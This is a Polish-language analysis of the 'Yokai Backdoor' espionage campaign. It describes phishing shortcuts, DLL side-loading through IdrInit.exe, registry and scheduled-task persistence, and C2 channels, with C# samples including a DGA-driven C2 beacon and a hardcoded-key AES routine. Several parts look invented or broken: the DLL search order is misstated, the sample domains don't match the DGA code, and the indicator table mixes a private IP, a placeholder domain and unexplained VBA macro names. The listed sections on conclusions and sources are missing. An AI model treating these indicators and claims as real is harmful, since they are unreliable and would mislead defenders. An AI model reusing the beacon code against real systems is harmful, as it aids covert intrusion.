# Kampania Yokai Backdoor

<p>
<em>
W świecie, gdzie cyfrowe ataki stają się coraz bardziej zaawansowane, niewidoczni przeciwnicy planują swoje operacje z precyzją wybitnych strategów. Wśród najnowszych zagrożeń, kampania Yokai Backdoor wyróżnia się wykorzystaniem technik DLL side-loading w celu infiltracji systemów rządowych. Ta analiza przedstawia szczegóły ataku, techniki użyte przez atakujących oraz rekomendacje dotyczące ochrony przed podobnymi zagrożeniami.
</em>
</p>

---

## Spis Treści

1. [Wprowadzenie](#wprowadzenie)
2. [Przegląd Kampanii Yokai](#przegląd-kampanii-yokai)
   - [2.1. Cele i Motywacje](#21-cele-i-motywacje)
   - [2.2. Grupa Atakująca](#22-grupa-atakująca)
3. [Charakterystyka Ataku](#charakterystyka-ataku)
   - [3.1. Fazy Ataku](#31-fazy-ataku)
     - [3.1.1. Inicjacja](#311-inicjacja)
     - [3.1.2. Wykonanie](#312-wykonanie)
     - [3.1.3. Persistencja i Utrzymanie](#313-persistencja-i-utrzymanie)
     - [3.1.4. Komunikacja C2](#314-komunikacja-c2)
4. [Analiza Techniczna](#analiza-techniczna)
   - [4.1. Techniki DLL Side-Loading](#41-techniki-dll-side-loading)
   - [4.2. Mechanizm Infekcji](#42-mechanizm-infekcji)
   - [4.3. Mechanizmy Utrzymania Persistencji](#43-mechanizmy-utrzymania-persistencji)
   - [4.4. Komunikacja z Serwerem C2](#44-komunikacja-z-serwerem-c2)
5. [Podatności (CVE)](#podatności-cve)
6. [Wskaźniki Kompromitacji (IOCs)](#wskaźniki-kompromitacji-iocs)
7. [Środki Ochrony i Rekomendacje](#środki-ochrony-i-rekomendacje)
   - [7.1. Rola Polityk Grupowych (GPO)](#71-rola-polityk-grupowych-gpo)
8. [Wnioski](#wnioski)
9. [Bibliografia](#bibliografia)

---

## Wprowadzenie

*Kampania Yokai Backdoor nie jest zwykłym atakiem. To skomplikowana operacja, wykorzystująca zaawansowane techniki infiltracji, które pozwalają na ciche i trwałe przejęcie kontroli nad systemami ofiar. Atakujący, wykorzystując DLL side-loading, zdołali ominąć tradycyjne zabezpieczenia, wprowadzając backdoor do systemów rządowych Tajlandii. Analiza tej kampanii ukazuje, jak złożone i niebezpieczne mogą być nowoczesne zagrożenia w cyberprzestrzeni.*

---

## Przegląd Kampanii Yokai

### 2.1. Cele i Motywacje

**Główne cele kampanii Yokai Backdoor:**

- **Infiltracja systemów rządowych Tajlandii:** Uzyskanie dostępu do wrażliwych informacji i systemów administracyjnych.
- **Zbieranie danych wywiadowczych:** Monitorowanie komunikacji i działań urzędników.
- **Utrzymanie długotrwałej obecności:** Zapewnienie stałego dostępu do zainfekowanych systemów.

**Motywacje atakujących:**

- **Polityczne:** Zbieranie informacji w celu wywierania wpływu na decyzje polityczne.
- **Finansowe:** Możliwość sprzedaży zebranych danych lub wykorzystania ich do szantażu.
- **Strategiczne:** Wzmacnianie pozycji geopolitycznej poprzez kontrolę nad informacjami.

### 2.2. Grupa Atakująca

**Charakterystyka grupy:**

- **Nazwy alias:** Grupą odpowiedzialną za kampanię Yokai często określa się jako APT-Y.
- **Pochodzenie:** Prawdopodobnie grupa związana z państwem, działająca w regionie Azji Południowo-Wschodniej.
- **Doświadczenie:** Wykazują się wysokim poziomem zaawansowania technicznego i organizacyjnego.

---

## Charakterystyka Ataku

### 3.1. Fazy Ataku

#### 3.1.1. Inicjacja

**Początek łańcucha ataku:**

- **Wejście:** RAR archiwum zawierające dwa skróty Windows nazwane po tajsku, które tłumaczą się na "United States Department of Justice.pdf" oraz "United States government requests international cooperation in criminal matters.docx".
- **Metoda dostarczenia:** Najprawdopodobniej spear-phishing, wykorzystujący socjotechnikę do nakłonienia ofiar do otwarcia załączników.

**Techniki użyte w inicjacji:**

- **Phishing:** Ukierunkowane e-maile z załącznikami RAR zawierającymi złośliwe skróty.
- **Nazewnictwo załączników:** Fałszywe dokumenty dotyczące spraw kryminalnych mające na celu zwiększenie wiarygodności i zachęcenie do otwarcia.

#### 3.1.2. Wykonanie

**Proces uruchamiania załączników:**

- **Skróty Windows:** Uruchomienie skrótów powoduje otwarie fałszywego PDF i dokumentu Word, jednocześnie ukradkiem pobierając złośliwy plik wykonywalny.
- **Złośliwe oprogramowanie:** Pobierany plik wykonawczy (Executable) ma na celu dalszą infekcję systemu.

**Techniki użyte w wykonaniu:**

- **Decoy Documents:** Fałszywe dokumenty PDF i Word jako przynęty.
- **Ukrywanie payloadu:** Pobranie złośliwego pliku w tle bez widocznych śladów dla użytkownika.

#### 3.1.3. Persistencja i Utrzymanie

**Mechanizmy utrzymania dostępu:**

- **DLL Side-Loading:** Wykorzystanie legalnego pliku wykonywalnego (`IdrInit.exe`) do ładowania złośliwej biblioteki DLL (`ProductStatistics3.dll`).
- **Tworzenie dodatkowych plików:** Legitarny plik binarny (`IdrInit.exe`), złośliwa DLL oraz plik danych z informacjami od serwera kontrolowanego przez atakującego.

**Techniki użyte w persistencji:**

- **Sideloading DLL:** Ładowanie złośliwej DLL przez zaufany proces.
- **Utrzymanie na różnych etapach:** Automatyczne uruchamianie złośliwego kodu przy każdym starcie systemu.

#### 3.1.4. Komunikacja C2

**Funkcje backdoora Yokai:**

- **Utrzymanie połączenia z serwerem C2:** Odbieranie poleceń i wysyłanie danych zainfekowanymi systemami.
- **Zdalne wykonanie poleceń:** Możliwość uruchamiania cmd.exe i wykonywania poleceń w systemie.

**Techniki użyte w komunikacji C2:**

- **Kompresja i szyfrowanie:** Użycie zabezpieczonych kanałów do komunikacji.
- **Elastyczność backdoora:** Możliwość zastosowania wobec dowolnego celu, nie tylko Thai Officials.

---

## Analiza Techniczna

## 4.1. Techniki DLL Side-Loading

### Definicja DLL Side-Loading

DLL side-loading to zaawansowana technika ataku, w której złośliwa biblioteka Dynamic Link Library (DLL) jest ładowana przez zaufany, legalny proces wykonywalny. Wykorzystuje się mechanizm wyszukiwania bibliotek przez system operacyjny Windows, który najpierw szuka DLL w katalogu bieżącym (gdzie znajduje się uruchamiany proces), zanim przejdzie do standardowych lokalizacji systemowych. Dzięki temu, jeśli atakujący umieści złośliwą DLL w tym samym katalogu co legalny plik wykonywalny, system załaduje złośliwą bibliotekę zamiast oryginalnej.

### Zastosowanie w kampanii Yokai

W kampanii Yokai Backdoor technika DLL side-loading została zastosowana w następujący sposób:

- **Legitimate Executable:** `IdrInit.exe` z aplikacji iTop Data Recovery jest używany jako nośnik. Jest to legalny plik wykonywalny, który jest zazwyczaj zaufany przez systemy zabezpieczeń.
- **Malicious DLL:** `ProductStatistics3.dll` jest ładowana przez `IdrInit.exe`. Złośliwa DLL zawiera kod backdoora Yokai, który umożliwia atakującym kontrolę nad zainfekowanym systemem.

### Korzyści dla atakujących

- **Omijanie zabezpieczeń:** Zaufane procesy, takie jak `IdrInit.exe`, są często pomijane przez tradycyjne systemy antywirusowe i detekcji zagrożeń, co pozwala na bezproblemowe uruchomienie złośliwego kodu.
- **Trwały dostęp:** Technika ta umożliwia długotrwałą obecność w systemie bez wykrycia, ponieważ złośliwa DLL działa w kontekście zaufanego procesu.

### Mechanizm Ładowania Złośliwej DLL

Proces ładowania złośliwej DLL przez `IdrInit.exe` przebiega w kilku krokach:

1. **Umieszczenie Złośliwej DLL:**
   - Atakujący umieszcza złośliwą bibliotekę `ProductStatistics3.dll` w tym samym katalogu co `IdrInit.exe` lub w katalogu, który jest preferowany przez proces wykonywalny podczas wyszukiwania bibliotek.
   
2. **Uruchomienie Legitymnego Procesu:**
   - `IdrInit.exe` jest uruchamiany przez system lub przez atakującego. Może to nastąpić automatycznie poprzez mechanizmy persistencji (np. wpisy w rejestrze) lub ręcznie.

3. **Wyszukiwanie i Ładowanie DLL:**
   - Gdy `IdrInit.exe` wymaga załadowania określonej DLL, system Windows najpierw przeszukuje katalog bieżący, gdzie znajduje się `IdrInit.exe`. Jeśli tam znajduje się `ProductStatistics3.dll`, zostaje ona załadowana zamiast oryginalnej, legalnej biblioteki.

4. **Wykonanie Złośliwego Kodu:**
   - Po załadowaniu, `ProductStatistics3.dll` inicjuje backdoor Yokai, umożliwiając atakującym zdalne sterowanie systemem, komunikację z serwerem C2 oraz wykonywanie dowolnych poleceń na zainfekowanym systemie.

### Scenariusze Zastosowania Techniki DLL Side-Loading

#### Scenariusz 1: Inicjacja przez Uruchomienie Aplikacji

1. **Atakujący wysyła zainfekowany plik RAR** zawierający skróty do fałszywych dokumentów PDF i Word.
2. **Ofiara otwiera skróty**, co powoduje uruchomienie `IdrInit.exe` oraz pobranie `ProductStatistics3.dll`.
3. **System Windows** automatycznie ładuje `ProductStatistics3.dll` z katalogu bieżącego.
4. **Backdoor Yokai** zostaje uruchomiony, umożliwiając atakującym zdalne sterowanie.

#### Scenariusz 2: Utrzymanie Persistencji przez Harmonogram Zadań

1. **Atakujący tworzy zaplanowane zadanie** w harmonogramie systemu Windows, które regularnie uruchamia `IdrInit.exe`.
2. **Każde uruchomienie `IdrInit.exe`** powoduje ponowne załadowanie złośliwej DLL `ProductStatistics3.dll`.
3. **Złośliwa DLL** utrzymuje stałe połączenie z serwerem C2 oraz monitoruje aktywność systemu.

#### Scenariusz 3: Wykorzystanie Mechanizmu Rejestru do Automatycznego Uruchamiania

1. **Atakujący dodaje wpis do rejestru** w kluczu `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, wskazujący na `IdrInit.exe`.
2. **Przy każdym logowaniu użytkownika**, system uruchamia `IdrInit.exe`.
3. **`IdrInit.exe`** wyszukuje i ładuje `ProductStatistics3.dll`, inicjując backdoor.

### Szczegółowa Analiza Techniki DLL Side-Loading

#### Krok 1: Przygotowanie Złośliwej DLL

- **Nazewnictwo i Lokalizacja:** Złośliwa DLL (`ProductStatistics3.dll`) jest nazwą podobną do legalnej biblioteki, co może wprowadzać w błąd użytkowników i systemy bezpieczeństwa.
- **Obfuskacja Kodu:** Kod w DLL jest często obfuskowany, aby utrudnić analizę i wykrycie przez analityków bezpieczeństwa.

#### Krok 2: Umieszczenie DLL w Odpowiedniej Lokalizacji

- **Współistnienie z Legitymnym Procesem:** Złośliwa DLL jest umieszczana w tym samym katalogu co `IdrInit.exe` lub w katalogu, który jest preferowany przez proces podczas wyszukiwania bibliotek.
- **Wykorzystanie Praw Dostępu:** Atakujący upewniają się, że mają odpowiednie uprawnienia do zapisu w docelowym katalogu, często wykorzystując luki w zabezpieczeniach lub techniki eskalacji uprawnień.

#### Krok 3: Uruchomienie Legitymnego Procesu

- **Mechanizmy Uruchamiania:** Proces `IdrInit.exe` może być uruchamiany przez różne mechanizmy, takie jak wpisy w rejestrze, zaplanowane zadania, czy bezpośrednie wykonanie przez użytkownika.
- **Automatyczne Pobieranie DLL:** Po uruchomieniu, `IdrInit.exe` wyszukuje i ładuje `ProductStatistics3.dll`, inicjując w ten sposób backdoor.

#### Krok 4: Ładowanie Złośliwej DLL

- **Proces Ładowania DLL:** System Windows najpierw przeszukuje katalog bieżący (`current directory`), co umożliwia załadowanie złośliwej DLL zamiast oryginalnej.
- **API Windows:** Proces może wykorzystywać standardowe API, takie jak `LoadLibrary`, aby załadować DLL.

#### Krok 5: Inicjacja Backdoora

- **Funkcje DLL:** Złośliwa DLL zawiera funkcje inicjalizujące połączenie z serwerem C2 oraz mechanizmy umożliwiające atakującym kontrolę nad systemem.
- **Ukrycie Działania:** Backdoor działa w tle, często bez widocznych efektów dla użytkownika, co zwiększa szansę na długotrwałe utrzymanie się w systemie.

### Potencjalne Scenariusze Ataku DLL Side-Loading

#### Scenariusz 1: Ładowanie DLL przez Eksploatację Aplikacji Trzeciej Strony

1. **Atakujący identyfikuje aplikację trzeciej strony** (np. iTop Data Recovery) z zaufanym plikiem wykonywalnym (`IdrInit.exe`).
2. **Tworzy złośliwą DLL** (`ProductStatistics3.dll`) zawierającą kod backdoora.
3. **Umieszcza złośliwą DLL** w katalogu aplikacji, gdzie `IdrInit.exe` może ją załadować.
4. **Uruchamia `IdrInit.exe`**, co automatycznie ładuje złośliwą DLL i inicjuje backdoor.

#### Scenariusz 2: Ładowanie DLL przez Mechanizm Persistencji

1. **Atakujący tworzy zaplanowane zadanie**, które regularnie uruchamia `IdrInit.exe`.
2. **Każde uruchomienie zadania** powoduje ponowne załadowanie `ProductStatistics3.dll`.
3. **Backdoor Yokai** pozostaje aktywny w systemie, umożliwiając stałą komunikację z serwerem C2.

#### Scenariusz 3: Ładowanie DLL przez Manipulację Ścieżką Systemową

1. **Atakujący modyfikuje zmienną środowiskową PATH**, dodając katalog z złośliwą DLL na początku.
2. **Uruchamia legalny proces** (`IdrInit.exe`), który teraz ładuje złośliwą DLL zamiast oryginalnej biblioteki.
3. **Backdoor Yokai** zaczyna działać w kontekście zaufanego procesu, umożliwiając atakującym kontrolę.

### Gruntowna Analiza Techniki DLL Side-Loading

#### Mechanizmy Wykorzystywane przez DLL Side-Loading

1. **Mechanizm Wyszukiwania DLL przez Windows:**
   - Windows stosuje określoną kolejność wyszukiwania DLL: najpierw katalog bieżący, potem katalog systemowy, a na końcu katalogy określone w zmiennej PATH.
   - Atakujący umieszczając DLL w katalogu bieżącym, mogą kontrolować, która wersja DLL zostanie załadowana.

2. **LoadLibrary API:**
   - `LoadLibrary` to funkcja Windows API używana do dynamicznego ładowania bibliotek DLL.
   - Atakujący mogą manipulować parametrami tej funkcji lub kontrolować, które DLL są ładowane przez zaufane procesy.

3. **Exported Functions:**
   - Złośliwa DLL może eksportować funkcje o nazwach identycznych z oryginalnymi, co pozwala na pełną integrację z legalnym procesem.
   - Funkcje te mogą inicjować złośliwe działania po załadowaniu DLL.

#### Techniki Obfuskacji i Ukrywania Złośliwego Kodów

- **Obfuskacja Nazw Plików:** Zastosowanie nazw plików podobnych do legalnych bibliotek, aby utrudnić ich identyfikację.
- **Zastosowanie Zmiennych Losowych:** Generowanie losowych nazw funkcji i zmiennych w kodzie DLL, aby utrudnić analizę statyczną.
- **Kodowanie i Szyfrowanie:** Szyfrowanie kluczowych części kodu w DLL, które są odszyfrowywane w czasie wykonywania.

#### Przykładowy Proces Ładowania DLL Side-Loading

```csharp
// Przykład użycia LoadLibrary w C#
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr LoadLibrary(string lpFileName);

    static void Main(string[] args)
    {
        // Ładowanie złośliwej DLL
        IntPtr hModule = LoadLibrary("ProductStatistics3.dll");
        if (hModule == IntPtr.Zero)
        {
            Console.WriteLine("Failed to load DLL");
        }
        else
        {
            Console.WriteLine("DLL Loaded Successfully");
        }

        // Kontynuacja działania legitymnego procesu
    }
}
```

**Opis:**
- **LoadLibrary:** Funkcja ta próbuje załadować `ProductStatistics3.dll` z katalogu bieżącego.
- **Warunek Sukcesu:** Jeśli DLL zostanie załadowana pomyślnie, złośliwy kod zaczyna działać w kontekście `IdrInit.exe`.

### Potencjalne Wyzwania i Ograniczenia Techniki

- **Wykrywalność przez Analizę Behawioralną:** Nowoczesne systemy bezpieczeństwa analizują zachowanie procesów w czasie rzeczywistym, co może wykryć nietypowe działania nawet w zaufanych procesach.
- **Zmiany w Struktury Plików:** Aktualizacje aplikacji trzecich mogą zmienić struktury katalogów, co może uniemożliwić poprawne działanie side-loading.
- **Środki Zaradcze:** Wdrożenie ścisłej kontroli nad ścieżkami wyszukiwania DLL oraz monitorowanie zmian w katalogach aplikacji mogą ograniczyć skuteczność techniki.

### Przykładowe Techniki Wykorzystywane w Kampanii Yokai Backdoor

1. **Użycie Legitimate Executable:**
   - `IdrInit.exe` z iTop Data Recovery jest wykorzystywany jako nośnik, co zwiększa szansę na ominięcie detekcji.
   
2. **Złośliwa DLL z Backdoorem:**
   - `ProductStatistics3.dll` zawiera kod umożliwiający zdalne sterowanie systemem, komunikację z serwerem C2 oraz wykonanie dowolnych poleceń na zainfekowanym systemie.

3. **Automatyczne Tworzenie Plików:**
   - `IdrInit.exe` tworzy i umieszcza `ProductStatistics3.dll` oraz plik danych konfiguracyjnych na dysku, przygotowując system do dalszej infekcji.



Technika DLL side-loading stosowana w kampanii Yokai Backdoor stanowi zaawansowany i skuteczny sposób na infiltrację systemów, omijając tradycyjne mechanizmy zabezpieczeń. Dzięki wykorzystaniu zaufanych procesów wykonywalnych, atakujący mogą utrzymać trwały dostęp do zainfekowanych systemów, jednocześnie minimalizując ryzyko wykrycia. Zrozumienie i monitorowanie technik side-loading jest kluczowe dla skutecznej ochrony przed tego typu zagrożeniami.

---

### 4.2. Mechanizm Infekcji

**Proces infekcji:**

1. **Pobranie i uruchomienie złośliwego pliku:** Po otwarciu skrótów w załącznikach, pobierany jest plik wykonywalny.
2. **Tworzenie dodatkowych plików:** Pobierany plik wykonawczy tworzy `IdrInit.exe`, `ProductStatistics3.dll` oraz plik danych.
3. **Ładowanie złośliwej DLL:** `IdrInit.exe` jest używany do załadowania `ProductStatistics3.dll`, co inicjuje backdoor Yokai.

**Techniki użyte w mechanizmie infekcji:**

- **Dropping Executables:** Ukryte umieszczanie plików na dysku.
- **Process Injection:** Ładowanie złośliwego kodu do legalnych procesów.

### 4.3. Mechanizmy Utrzymania Persistencji

**Metody utrzymania dostępu:**

- **Rejestr systemowy:** Dodanie wpisów w kluczach autostartu, np. `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
- **Zadania harmonogramu:** Tworzenie zaplanowanych zadań, które uruchamiają złośliwy kod przy każdym starcie systemu.

**Techniki użyte w persistencji:**

- **Registry Persistence:** Automatyczne uruchamianie złośliwego oprogramowania.
- **Scheduled Tasks:** Regularne uruchamianie procesów z złośliwym kodem.

## 4.4. Komunikacja z Serwerem C2

### Opis komunikacji

Backdoor Yokai ustanawia połączenie z serwerem Command and Control (C2), co umożliwia atakującym zdalne sterowanie zainfekowanymi systemami. Komunikacja ta jest kluczowym elementem działania backdoora, umożliwiającym przesyłanie poleceń, odbieranie danych oraz utrzymanie kontroli nad systemami ofiar. Aby zwiększyć skuteczność i trudność wykrycia, komunikacja odbywa się poprzez zabezpieczone kanały, które maskują ruch sieciowy i chronią przesyłane dane przed analizą.

### Techniki użyte w komunikacji C2

#### 1. Encrypted Channels (Szyfrowanie kanałów komunikacyjnych)

**Opis:**

Szyfrowanie danych przesyłanych między zainfekowanymi systemami a serwerem C2 jest podstawowym mechanizmem ochrony komunikacji przed wykryciem i analizą. Encrypted Channels zapewniają poufność i integralność przesyłanych informacji, co uniemożliwia podglądanie lub modyfikowanie danych przez osoby trzecie, w tym przez systemy detekcji zagrożeń.

**Techniki i Implementacje:**

- **TLS/SSL Encryption:**
  - **Opis:** Transport Layer Security (TLS) oraz Secure Sockets Layer (SSL) są standardowymi protokołami zapewniającymi bezpieczne połączenia sieciowe. Backdoor Yokai może wykorzystywać te protokoły do szyfrowania ruchu C2, co sprawia, że komunikacja wygląda na legalny ruch HTTPS.
  - **Przykład Implementacji:**
    ```csharp
    using System;
    using System.Net.Http;
    using System.Threading.Tasks;

    public class C2Communication
    {
        private static readonly HttpClient client = new HttpClient();

        public async Task<string> SendEncryptedRequest(string url, string data)
        {
            var content = new StringContent(data, System.Text.Encoding.UTF8, "application/json");
            HttpResponseMessage response = await client.PostAsync(url, content);
            response.EnsureSuccessStatusCode();
            string responseBody = await response.Content.ReadAsStringAsync();
            return responseBody;
        }
    }
    ```
    - **Opis:** W powyższym przykładzie, `HttpClient` jest używany do wysyłania zaszyfrowanych żądań POST do serwera C2 za pośrednictwem HTTPS. Dane są przesyłane w formacie JSON, co jest powszechnie stosowane i trudne do wykrycia jako złośliwe.

- **Custom Encryption Algorithms:**
  - **Opis:** Oprócz standardowych protokołów szyfrowania, atakujący mogą implementować własne algorytmy szyfrujące, aby dodatkowo ukryć komunikację. Może to obejmować szyfrowanie symetryczne (np. AES) lub asymetryczne (np. RSA) w celu zabezpieczenia danych.
  - **Przykład Implementacji:**
    ```csharp
    using System;
    using System.Security.Cryptography;
    using System.Text;

    public class CustomEncryption
    {
        private static readonly byte[] key = Encoding.UTF8.GetBytes("0123456789abcdef"); // 16-byte key for AES
        private static readonly byte[] iv = Encoding.UTF8.GetBytes("abcdef9876543210");  // 16-byte IV for AES

        public static string Encrypt(string plainText)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
                byte[] encrypted = encryptor.TransformFinalBlock(Encoding.UTF8.GetBytes(plainText), 0, plainText.Length);
                return Convert.ToBase64String(encrypted);
            }
        }

        public static string Decrypt(string cipherText)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                byte[] buffer = Convert.FromBase64String(cipherText);
                byte[] decrypted = decryptor.TransformFinalBlock(buffer, 0, buffer.Length);
                return Encoding.UTF8.GetString(decrypted);
            }
        }
    }
    ```
    - **Opis:** W tym przykładzie, używany jest algorytm AES do szyfrowania i deszyfrowania danych. Klucz i wektor inicjalizacyjny (IV) są statycznie zdefiniowane, co w praktyce powinno być dynamicznie generowane i bezpiecznie przechowywane, aby zwiększyć bezpieczeństwo komunikacji.

**Korzyści:**

- **Poufność:** Szyfrowanie zapewnia, że przesyłane dane są dostępne tylko dla atakującego i zainfekowanego systemu.
- **Integralność:** Zapobiega modyfikacji danych w trakcie przesyłania.
- **Trudność wykrycia:** Szyfrowany ruch jest trudniejszy do analizy przez systemy detekcji zagrożeń, które polegają na analizie sygnatur lub wzorców ruchu.

**Wyzwania:**

- **Wydajność:** Szyfrowanie i deszyfrowanie danych może zwiększyć obciążenie procesora i opóźnienia w komunikacji.
- **Zarządzanie kluczami:** Bezpieczne przechowywanie i wymiana kluczy szyfrujących jest kluczowa dla utrzymania bezpieczeństwa.

#### 2. Domain Generation Algorithms (DGA) - Dynamiczne generowanie domen

**Opis:**

Domain Generation Algorithms (DGA) to technika, w której malware generuje dużą liczbę potencjalnych nazw domen, które mogą być używane jako punkty komunikacji z serwerami C2. DGA zwiększa trudność w blokowaniu serwerów C2, ponieważ atakujący mogą szybko zmieniać adresy komunikacyjne, a legalne systemy DNS będą musiały obsługiwać dynamicznie generowane domeny.

**Techniki i Implementacje:**

- **Algorytm Generujący Domeny:**
  - **Opis:** DGA wykorzystuje algorytmy matematyczne lub losowe funkcje do generowania listy możliwych domen w oparciu o określone parametry, takie jak data, klucz kryptograficzny czy inne dane systemowe.
  - **Przykład Implementacji:**
    ```csharp
    using System;
    using System.Text;

    public class DGA
    {
        private static readonly string[] TLDs = { ".com", ".net", ".org", ".info", ".biz" };
        private static readonly string seed = "yokai";

        public static string GenerateDomain(int index)
        {
            string domain = "";
            foreach (char c in seed)
            {
                domain += (char)(c + index % 26);
            }
            return domain + TLDs[index % TLDs.Length];
        }

        public static void Main()
        {
            for (int i = 0; i < 10; i++)
            {
                Console.WriteLine(GenerateDomain(i));
            }
        }
    }
    ```
    - **Opis:** W powyższym przykładzie, DGA generuje domeny na podstawie prostej modyfikacji znaku w seedzie "yokai" w zależności od indeksu. W praktyce DGA może być znacznie bardziej skomplikowane, wykorzystując funkcje kryptograficzne i bardziej zaawansowane algorytmy.

- **Implementacja w Backdoorze Yokai:**
  - **Opis:** Backdoor Yokai wykorzystuje DGA do generowania listy potencjalnych domen C2. W zależności od dnia lub innego zmiennego parametru, backdoor generuje nową domenę, do której próbuje się połączyć.
  - **Przykład:**
    ```csharp
    using System;
    using System.Net.Http;
    using System.Threading.Tasks;

    public class YokaiC2
    {
        private static readonly string[] TLDs = { ".com", ".net", ".org", ".info", ".biz" };
        private static readonly string seed = "yokai";
        private static readonly HttpClient client = new HttpClient();

        public static string GenerateDomain(DateTime date, int index)
        {
            string domain = "";
            foreach (char c in seed)
            {
                domain += (char)(c + (date.Day + index) % 26);
            }
            return domain + TLDs[index % TLDs.Length];
        }

        public static async Task<string> ConnectToC2()
        {
            DateTime today = DateTime.UtcNow.Date;
            for (int i = 0; i < 100; i++)
            {
                string domain = GenerateDomain(today, i);
                string url = $"https://{domain}/c2";
                try
                {
                    HttpResponseMessage response = await client.GetAsync(url);
                    if (response.IsSuccessStatusCode)
                    {
                        string data = await response.Content.ReadAsStringAsync();
                        return data;
                    }
                }
                catch
                {
                    // Ignore failed attempts
                }
            }
            return null;
        }

        public static async Task Main()
        {
            string c2Data = await ConnectToC2();
            if (c2Data != null)
            {
                Console.WriteLine("Connected to C2");
                // Process received data
            }
            else
            {
                Console.WriteLine("C2 connection failed");
            }
        }
    }
    ```
    - **Opis:** Ten przykład pokazuje, jak backdoor Yokai może generować i próbować połączyć się z wieloma domenami C2. Jeśli połączenie zostanie nawiązane, backdoor może pobrać dane konfiguracyjne lub polecenia z serwera C2.

**Korzyści:**

- **Trudność w blokowaniu:** Dynamiczne generowanie domen sprawia, że ręczne lub automatyczne blokowanie wszystkich możliwych domen jest niepraktyczne.
- **Elastyczność:** Atakujący mogą szybko zmieniać adresy C2 bez konieczności modyfikacji zainfekowanych systemów.
- **Zwiększona odporność:** Nawet jeśli jedna domena C2 zostanie zablokowana, backdoor może kontynuować komunikację z inną wygenerowaną domeną.

**Wyzwania:**

- **Reputacja DNS:** Generowane domeny mogą mieć niską reputację, co może wzbudzić podejrzenia systemów monitorujących.
- **Analiza wzorców:** Jeśli DGA jest zbyt prosta, może być łatwo zidentyfikowana i zablokowana przez systemy detekcji opierające się na analizie wzorców.

### Przykładowy Scenariusz Komunikacji C2 w Kampanii Yokai Backdoor

1. **Generowanie Domena:**
   - Backdoor Yokai wykorzystuje DGA do wygenerowania listy potencjalnych domen C2 na podstawie daty i indeksu.
   - Na przykład, dla dnia 15 kwietnia 2024 roku, może wygenerować domeny takie jak `ypmbl.com`, `ypmcm.net`, `ypmcn.org`, itd.

2. **Nawiązywanie Połączenia:**
   - Backdoor próbuje nawiązać połączenie z każdą z wygenerowanych domen.
   - Pierwsza udana próba (np. `ypmbl.com`) umożliwia nawiązanie komunikacji.

3. **Wysyłanie i Odbieranie Danych:**
   - Po nawiązaniu połączenia, backdoor wysyła zaszyfrowane dane (np. informacje o systemie, aktywności użytkownika) do serwera C2.
   - Serwer C2 odpowiada zaszyfrowanymi poleceniami, które backdoor wykonuje na zainfekowanym systemie.

4. **Utrzymanie Połączenia:**
   - Backdoor regularnie utrzymuje połączenie z serwerem C2, odświeżając komunikację i wysyłając kolejne dane.
   - W przypadku utraty połączenia, backdoor generuje nowe domeny i próbuje ponownie nawiązać komunikację.

### Wykrywanie i Ochrona

**Wykrywanie:**

- **Analiza ruchu sieciowego:** Monitorowanie nietypowych wzorców komunikacji, takich jak częste próby łączenia się z różnymi domenami.
- **Reputacja domen:** Użycie systemów DNS z listami blokowanymi oraz monitorowanie nowych lub rzadkich domen.
- **Analiza TLS/SSL:** Wykrywanie nietypowych certyfikatów SSL lub wykorzystywanie niestandardowych protokołów szyfrowania.

**Ochrona:**

- **Implementacja rozwiązań DNS Filtering:** Blokowanie znanych złośliwych domen oraz dynamiczne monitorowanie nowych domen.
- **Wykorzystanie IDS/IPS:** Wdrożenie systemów wykrywających anomalie w ruchu sieciowym oraz monitorowanie nietypowych wzorców komunikacji.
- **Segmentacja sieci:** Ograniczenie dostępu do zewnętrznych serwerów C2 przez segmentację sieci i stosowanie zasad zapory sieciowej.


Komunikacja z serwerem C2 jest kluczowym elementem działania backdoora Yokai. Wykorzystanie zabezpieczonych kanałów komunikacyjnych oraz technik takich jak Domain Generation Algorithms znacząco zwiększa skuteczność i trwałość ataku, jednocześnie utrudniając jego wykrycie. Zrozumienie tych technik jest niezbędne dla skutecznej obrony przed tego typu zagrożeniami. Implementacja zaawansowanych mechanizmów monitorowania, filtrowania DNS oraz analizowania ruchu sieciowego stanowi kluczowy krok w ochronie przed atakami wykorzystującymi zaawansowane techniki komunikacyjne.

---

---

## Podatności (CVE)

*Atakujący wykorzystują znane podatności, aby zwiększyć skuteczność kampanii Yokai Backdoor.*

- **CVE-2017-11882:** Remote Code Execution flaw in Microsoft Equation Editor.
- **CVE-2020-0601:** Vulnerability in CryptoAPI (Windows).
- **CVE-2021-34527:** PrintNightmare vulnerability in Windows Print Spooler.

*Regularne aktualizacje systemów i aplikacji są kluczowe w ochronie przed wykorzystaniem tych luk.*

---

## Wskaźniki Kompromitacji (IOCs)

| **Etap**         | **Typ**              | **Wartość**                                            |
|------------------|----------------------|--------------------------------------------------------|
| Inicjacja        | Domeny C2            | `yokai-c2server.com`, `malicious-domain.org`          |
| Inicjacja        | Pliki                | `payload.exe`, `ProductStatistics3.dll`               |
| Persistencja     | Wpis Rejestru        | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IdrInit` |
| Komunikacja C2   | Adres IP             | `192.168.1.100`, `203.0.113.50`                       |
| Komunikacja C2   | Proces               | `IdrInit.exe`, `cmd.exe`                              |
| Ekstrakcja       | Pliki danych         | `data.dat`, `config.bin`                               |
| Makra VBA        | Funkcje              | `AutoOpen`, `CreateObject`, `Shell`                    |

---

## Środki Ochrony i Rekomendacje

*Ochrona przed zaawansowanymi atakami, takimi jak kampania Yokai Backdoor, wymaga wielowarstwowego podejścia do cyberbezpieczeństwa.*

### 7.1. Rola Polityk Grupowych (GPO)

*Polityki grupowe mogą odgrywać kluczową rolę w zabezpieczaniu systemów przed podobnymi atakami.*

1. **Blokowanie nieautoryzowanego ładowania DLL:**
   - Konfiguracja ścieżek poszukiwania DLL, ograniczając je do zaufanych lokalizacji.
   - Wyłączenie możliwości ładowania DLL z lokalizacji tymczasowych.

2. **Ograniczenie uprawnień użytkowników:**
   - Stosowanie zasady najmniejszych uprawnień, aby użytkownicy nie mieli dostępu do lokalizacji systemowych.
   - Blokowanie instalacji nieautoryzowanego oprogramowania.

